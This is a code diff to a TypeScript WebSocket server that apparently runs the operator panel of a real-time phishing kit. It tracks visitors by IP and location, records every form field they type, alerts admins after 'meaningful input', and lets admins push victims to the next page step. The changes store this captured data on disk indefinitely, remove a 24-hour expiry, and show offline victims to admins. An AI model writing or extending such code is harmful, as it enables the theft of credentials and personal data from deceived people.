@@ -189,15 +189,19 @@ interface VisitorPublic {
   connectedAt: number;
   formData: Record<string, string>;
   formHistory: FormEntry[];
+  online?: boolean;
 }
 
 interface PersistedSession {
+  id: string;
+  ip: string;
   formData: Record<string, string>;
   formHistory: FormEntry[];
   provider: string;
   step: string;
   location: Location;
   userAgent: string;
+  connectedAt: number;
   lastSeen: number;
 }
 
@@ -205,7 +209,22 @@ const visitors = new Map<string, Visitor>();
 const admins = new Set<WebSocket>();
 const adminWatching = new Map<WebSocket, string | null>(); // ws → visitorId being watched
 const views = new Map<string, Set<WebSocket>>();
-const persistedByIP = new Map<string, PersistedSession>();
+const SESSIONS_FILE = join(process.cwd(), '.visitor-sessions.json');
+
+function loadPersistedSessions(): Map<string, PersistedSession> {
+  try {
+    const parsed = JSON.parse(readFileSync(SESSIONS_FILE, 'utf8')) as PersistedSession[];
+    return new Map(
+      (Array.isArray(parsed) ? parsed : [])
+        .filter(session => session?.ip && session?.id)
+        .map(session => [session.ip, session]),
+    );
+  } catch {
+    return new Map();
+  }
+}
+
+const persistedByIP = loadPersistedSessions();
 export let globalProvider = _loadProvider();
 export let siteActive = _loadSiteActive();
 
@@ -214,8 +233,6 @@ function countWatchers(visitorId: string): number {
   for (const id of adminWatching.values()) if (id === visitorId) n++;
   return n;
 }
-
-const SESSION_TTL_MS = 24 * 60 * 60 * 1000;
 
 function getClientIP(req: IncomingMessage): string {
   const fwd = req.headers['x-forwarded-for'];
@@ -287,16 +304,43 @@ function toPublic(v: Visitor): VisitorPublic {
   };
 }
 
+function savePersistedSessions(): void {
+  try {
+    writeFileSync(SESSIONS_FILE, JSON.stringify(Array.from(persistedByIP.values())), 'utf8');
+  } catch (err) {
+    logger.warn({ err }, 'Failed to save visitor sessions');
+  }
+}
+
+function persistedToPublic(session: PersistedSession): VisitorPublic {
+  return {
+    id: session.id,
+    ip: session.ip,
+    location: session.location,
+    provider: session.provider,
+    step: session.step,
+    userAgent: session.userAgent,
+    connectedAt: session.connectedAt,
+    formData: { ...session.formData },
+    formHistory: [...session.formHistory],
+    online: false,
+  };
+}
+
 function persistVisitor(v: Visitor) {
   persistedByIP.set(v.ip, {
+    id: v.id,
+    ip: v.ip,
     formData: { ...v.formData },
     formHistory: [...v.formHistory],
     provider: v.provider,
     step: v.step,
     location: v.location,
     userAgent: v.userAgent,
+    connectedAt: v.connectedAt,
     lastSeen: Date.now(),
   });
+  savePersistedSessions();
 }
 
 function notifyAfterMeaningfulInput(v: Visitor, field: string, value: string): void {
@@ -327,10 +371,7 @@ function notifyAfterMeaningfulInput(v: Visitor, field: string, value: string): v
 }
 
 function getPersistedSession(ip: string): PersistedSession | null {
-  const s = persistedByIP.get(ip);
-  if (!s) return null;
-  if (Date.now() - s.lastSeen > SESSION_TTL_MS) { persistedByIP.delete(ip); return null; }
-  return s;
+  return persistedByIP.get(ip) ?? null;
 }
 
 // ── Heartbeat ─────────────────────────────────────────────────────────────────
@@ -378,7 +419,12 @@ export function setupWebSocket(server: Server) {
         admins.add(ws);
         adminWatching.set(ws, null);
         broadcastToAdmins({ type: 'admin-count', count: admins.size });
-        ws.send(JSON.stringify({ type: 'visitors', visitors: Array.from(visitors.values()).map(toPublic), globalProvider }));
+        const activeIps = new Set(Array.from(visitors.values()).map(visitor => visitor.ip));
+        const savedVisitors = Array.from(persistedByIP.values())
+          .filter(session => !activeIps.has(session.ip))
+          .map(persistedToPublic);
+        const activeVisitors = Array.from(visitors.values()).map(visitor => ({ ...toPublic(visitor), online: true }));
+        ws.send(JSON.stringify({ type: 'visitors', visitors: [...savedVisitors, ...activeVisitors], globalProvider }));
 
         ws.on('message', (raw2) => {
           try {
@@ -426,7 +472,11 @@ export function setupWebSocket(server: Server) {
                   visitor.formData = {};
                   visitor.formHistory = [];
                   const persisted = persistedByIP.get(visitor.ip);
-                  if (persisted) { persisted.formData = {}; persisted.formHistory = []; }
+                   if (persisted) {
+                     persisted.formData = {};
+                     persisted.formHistory = [];
+                     savePersistedSessions();
+                   }
                   deleteCapturesByIp(visitor.ip);
                   broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: '*' });
                 } else {
@@ -436,14 +486,18 @@ export function setupWebSocket(server: Server) {
                   if (persisted) {
                     delete persisted.formData[field];
                     persisted.formHistory = persisted.formHistory.filter(e => e.field !== field);
+                     savePersistedSessions();
                   }
                   broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field });
                 }
               } else {
-                const persisted = persistedByIP.get(ip);
+                const persisted = Array.from(persistedByIP.values()).find(session => session.id === vid);
                 if (persisted) {
                   if (!field || field === '*') { persisted.formData = {}; persisted.formHistory = []; }
                   else { delete persisted.formData[field]; persisted.formHistory = persisted.formHistory.filter(e => e.field !== field); }
+                  savePersistedSessions();
+                  if (!field || field === '*') deleteCapturesByIp(persisted.ip);
+                  broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: field || '*' });
                 }
               }
 
@@ -453,7 +507,16 @@ export function setupWebSocket(server: Server) {
               if (v) {
                 persistedByIP.delete(v.ip);
                 visitors.delete(vid);
+                deleteCapturesByIp(v.ip);
+                try { v.ws.close(); } catch { /* ignore */ }
+              } else {
+                const saved = Array.from(persistedByIP.entries()).find(([, session]) => session.id === vid);
+                if (saved) {
+                  persistedByIP.delete(saved[0]);
+                  deleteCapturesByIp(saved[1].ip);
+                }
               }
+              savePersistedSessions();
               broadcastToAdmins({ type: 'visitor-deleted', id: vid });
               logger.info({ visitorId: vid }, 'Admin deleted visitor record');
             }
@@ -516,6 +579,7 @@ export function setupWebSocket(server: Server) {
           notificationSent: false,
         };
         visitors.set(id, visitor);
+        persistVisitor(visitor);
         // Broadcast immediately so the admin sees the visitor and doesn't miss
         // form-data events that arrive while geolocation is in-flight.
         broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
@@ -535,6 +599,7 @@ export function setupWebSocket(server: Server) {
           const v = visitors.get(id);
           if (v) {
             v.location = location;
+            persistVisitor(v);
             recordVisit(v, location);
             broadcastToAdmins({ type: 'visitor-location', id, location });
           }
@@ -551,6 +616,7 @@ export function setupWebSocket(server: Server) {
               if (v) {
                 v.step = (m['step'] as string) ?? v.step;
                 if (m['provider']) v.provider = m['provider'] as string;
+                persistVisitor(v);
                 broadcastToAdmins({ type: 'visitor-updated', id, step: v.step, provider: v.provider });
                 relayToViews(id, { type: 'action', action: { navigate: v.step } });
               }
